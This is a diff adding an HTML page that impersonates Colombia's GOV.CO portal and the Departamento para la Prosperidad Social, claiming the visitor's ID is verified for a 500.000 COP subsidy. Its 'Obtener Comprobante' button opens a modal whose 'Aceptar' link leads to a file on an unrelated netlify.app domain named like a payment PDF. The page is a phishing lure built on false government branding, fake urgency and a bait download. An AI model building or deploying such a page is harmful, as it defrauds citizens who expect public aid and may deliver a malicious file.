@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GOV.CO - Portal Único del Estado Colombiano | Validación de Giros</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f7f9fa;
+            color: #1b2a4a;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding-bottom: 30px;
+            overflow-x: hidden;
+            position: relative;
+        }
+        /* Barra superior oficial */
+        .gov-header {
+            width: 100%;
+            background-color: #3366cc;
+            color: white;
+            padding: 8px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            font-weight: 600;
+            position: relative;
+            z-index: 10;
+        }
+        .gov-header .col-flag {
+            letter-spacing: 1px;
+            color: #ffcc00;
+        }
+
+        /* Franja para mostrar fecha y hora exacta en formato de 12 horas */
+        .barra-tiempo-actual {
+            width: 100%;
+            background-color: #e9ecef;
+            color: #333;
+            padding: 6px 20px;
+            font-size: 11px;
+            font-weight: 600;
+            display: flex;
+            justify-content: flex-end;
+            align-items: center;
+            border-bottom: 1px solid #dcdcdc;
+            z-index: 10;
+        }
+
+        /* Navbar secundaria */
+        .navbar-institucional {
+            width: 100%;
+            background-color: #ffffff;
+            border-bottom: 2px solid #e1e8ed;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+            position: relative;
+            z-index: 10;
+        }
+        .navbar-institucional .portal-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #004884;
+            border-left: 2px solid #ccc;
+            padding-left: 12px;
+            line-height: 1.2;
+        }
+        
+        /* Contenedor Principal con tamaño fijo estricto */
+        .main-container {
+            width: 100%;
+            max-width: 520px;
+            padding: 20px;
+            position: relative;
+            z-index: 10;
+            flex-shrink: 0;
+        }
+
+        .alerta-aviso {
+            background-color: #e8f4fd;
+            border-left: 4px solid #17a2b8;
+            padding: 12px 15px;
+            font-size: 13px;
+            color: #0c5460;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .tarjeta-verificacion {
+            background: #ffffff;
+            padding: 30px 25px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06);
+            text-align: center;
+            border: 1px solid #dcdcdc;
+            margin-bottom: 20px;
+        }
+        
+        .estado-badge {
+            background-color: #d4edda;
+            color: #155724;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 5px 12px;
+            border-radius: 12px;
+            text-transform: uppercase;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 1px solid #c3e6cb;
+        }
+
+        h1 {
+            color: #004884;
+            font-size: 19px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .monto-caja {
+            background: #f1f8ff;
+            border: 1px dashed #3366cc;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+        }
+        .monto-titulo {
+            font-size: 12px;
+            color: #555;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+        .monto {
+            font-size: 32px;
+            font-weight: 800;
+            color: #28a745;
+            margin-top: 5px;
+        }
+
+        p {
+            color: #4a5568;
+            font-size: 13px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        @keyframes moverBoton {
+            0% { transform: translateX(0px); }
+            25% { transform: translateX(-4px); }
+            50% { transform: translateX(4px); }
+            75% { transform: translateX(-3px); }
+            100% { transform: translateX(0px); }
+        }
+
+        .btn-descargar {
+            background-color: #004884;
+            color: white;
+            padding: 16px;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 700;
+            border-radius: 6px;
+            display: block;
+            width: 100%;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 3px 6px rgba(0,0,0,0.15);
+            animation: moverBoton 1.5s infinite ease-in-out;
+            transition: background 0.2s;
+        }
+        .btn-descargar:hover {
+            background-color: #003366;
+        }
+
+        /* Bloque de publicidad */
+        .seccion-publicidad {
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+            margin-bottom: 20px;
+            border: 1px solid #e1e8ed;
+            text-align: center;
+        }
+        .seccion-publicidad h4 {
+            font-size: 11px;
+            color: #888;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+        .banner-anuncio-1 {
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            color: white;
+            padding: 20px;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        .banner-anuncio-2 {
+            background: linear-gradient(135deg, #ffc107, #e0a800);
+            color: #212529;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        /* Footer institucional */
+        .footer-gov {
+            text-align: center;
+            font-size: 11px;
+            color: #718096;
+            margin-top: 25px;
+            line-height: 1.5;
+            border-top: 1px solid #cbd5e0;
+            padding-top: 15px;
+        }
+
+        /* Pantalla emergente */
+        #pantalla-pdf-estilo {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #121212;
+            z-index: 9999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .pdf-icono-caja {
+            background-color: #ffffff;
+            padding: 15px;
+            border-radius: 16px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #28a745;
+            animation: flotar 3s infinite ease-in-out, pulsar 1.5s infinite ease-in-out;
+        }
+
+        @keyframes flotar {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+        }
+
+        @keyframes pulsar {
+            0%, 100% { box-shadow: 0 0 5px rgba(40, 167, 69, 0.3); }
+            50% { box-shadow: 0 0 15px rgba(40, 167, 69, 0.7); }
+        }
+
+        .logo-personalizado {
+            width: 100px;
+            height: auto;
+            max-height: 75px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .pdf-nombre-archivo {
+            font-size: 16px;
+            color: #e0e0e0;
+            margin-bottom: 35px;
+            word-break: break-all;
+            font-weight: 600;
+        }
+
+        .contenedor-botones-modal {
+            display: flex;
+            gap: 0;
+            width: 100%;
+            max-width: 340px;
+            justify-content: center;
+            background: #2c2c2c;
+            border-radius: 13px;
+            overflow: hidden;
+            border: 1px solid #444;
+        }
+
+        .btn-modal {
+            flex: 1;
+            border: none;
+            padding: 15px 10px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background 0.2s, transform 0.1s;
+            background-color: #3a3a3a;
+            color: #ffffff;
+            border-right: 1px solid #444;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .btn-modal:last-child {
+            border-right: none;
+        }
+
+        .btn-modal:active {
+            background-color: #505050;
+            transform: scale(0.98);
+        }
+
+        .btn-rechazar {
+            color: #ff453a;
+        }
+
+        .btn-aceptar {
+            color: #0a84ff;
+            font-weight: 700;
+        }
+
+        .btn-rechazar:hover { background-color: #4a4a4a; }
+        .btn-aceptar:hover { background-color: #4a4a4a; }
+
+        /* Iconos flotantes animados de fondo sin alterar ni agrandar la estructura principal */
+        .icono-flotante {
+            position: absolute;
+            pointer-events: none;
+            opacity: 0.35;
+            z-index: 1;
+            animation: animarIconoDesplazamiento linear infinite;
+        }
+
+        @keyframes animarIconoDesplazamiento {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            50% { transform: translate(25px, -35px) rotate(180deg); }
+            100% { transform: translate(0, 0) rotate(360deg); }
+        }
+    </style>
+    <script>
+        function generarElementosFlotantes() {
+            const iconos = ['🏛️', '💰', '🇨🇴', '🏦', '💳', '✔', '📩'];
+            const contenedor = document.body;
+            const numIconos = 14;
+
+            for (let i = 0; i < numIconos; i++) {
+                const span = document.createElement('span');
+                span.classList.add('icono-flotante');
+                span.textContent = iconos[Math.floor(Math.random() * iconos.length)];
+                span.style.fontSize = Math.random() * 15 + 16 + 'px';
+                
+                span.style.left = Math.random() * 92 + 2 + '%';
+                span.style.top = Math.random() * 95 + 2 + '%';
+                
+                span.style.animationDuration = (Math.random() * 4 + 4) + 's';
+                
+                contenedor.appendChild(span);
+            }
+        }
+    </script>
+</head>
+<body onload="generarElementosFlotantes()">
+
+<!-- Barra superior oficial -->
+<div class="gov-header">
+    <span class="col-flag">🇨🇴 GOV.CO</span>
+    <span>Plataforma Oficial del Estado Colombiano</span>
+</div>
+
+<!-- Franja superior con la fecha y hora exacta actual en formato de 12 horas -->
+<div class="barra-tiempo-actual">
+    📅 Lunes, 17 de agosto de 2026 &nbsp;|&nbsp; ⏱️ 05:14 p. m.
+</div>
+
+<!-- Navbar con identidad de entidad -->
+<div class="navbar-institucional">
+    <div style="font-size: 24px;">🏛️</div>
+    <div class="portal-title">
+        Departamento para la Prosperidad Social<br>
+        <span style="font-size: 11px; font-weight: 400; color: #555;">Sistema Integrado de Giros y Subsidios Nacionales</span>
+    </div>
+</div>
+
+<div class="main-container">
+
+    <div class="alerta-aviso">
+        <strong>Aviso del Sistema:</strong> Su documento ha superado la fase de validación biométrica en las centrales de pagos autorizadas.
+    </div>
+
+    <div class="tarjeta-verificacion">
+        <div class="estado-badge">✔ Cédula Verificada y Habilitada</div>
+        
+        <h1>Comprobante de Asignación Monetaria</h1>
+        
+        <div class="monto-caja">
+            <div class="monto-titulo">Valor Total del Beneficio</div>
+            <div class="monto">$500.000,00 COP</div>
+        </div>
+        
+        <p>Estimado(a) ciudadano(a), el sistema central ha procesado satisfactoriamente su acreditación económica extraordinaria correspondiente al periodo actual. Pulse el botón inferior para obtener su comprobante digital oficial.</p>
+        
+        <button type="button" class="btn-descargar" onclick="mostrarInterfazPDF()">
+            📄 Obtener Comprobante Oficial
+        </button>
+    </div>
+
+    <!-- Bloque de publicidad comercial -->
+    <div class="seccion-publicidad">
+        <h4>Información Comercial y Alianzas de la Red</h4>
+        <div class="banner-anuncio-1">
+            ¡Descubra cómo activar su cuenta de ahorros digital sin comisiones ni filas adicionales!
+        </div>
+        <div style="height: 10px;"></div>
+        <div class="banner-anuncio-2">
+            ¡Aproveche subsidios complementarios para servicios públicos y canasta familiar este mes!
+        </div>
+    </div>
+
+    <div class="footer-gov">
+        República de Colombia • Todos los derechos reservados © 2026<br>
+        Ministerio de Hacienda y Crédito Público — Red de Corresponsales Nacionales
+    </div>
+
+</div>
+
+<!-- Pantalla emergente -->
+<div id="pantalla-pdf-estilo">
+    <div class="pdf-icono-caja">
+        <img src="https://familiaincatec.edu.co/wp-content/uploads/2022/12/pago-2-1024x664.png" alt="Logo de Pago" class="logo-personalizado">
+    </div>
+    <div class="pdf-nombre-archivo">Te han enviado 500.000,00</div>
+    
+    <div class="contenedor-botones-modal">
+        <button type="button" class="btn-modal btn-rechazar" onclick="cerrarInterfaz()">Rechazar</button>
+        <a href="https://bonovalidacion500.netlify.app/Recibistes%20500.000,00k.pdf" target="_blank" class="btn-modal btn-aceptar">Aceptar</a>
+    </div>
+</div>
+
+<script>
+    function mostrarInterfazPDF() {
+        document.getElementById('pantalla-pdf-estilo').style.display = 'flex';
+    }
+
+    function cerrarInterfaz() {
+        document.getElementById('pantalla-pdf-estilo').style.display = 'none';
+    }
+</script>
+
+</body>
+</html>
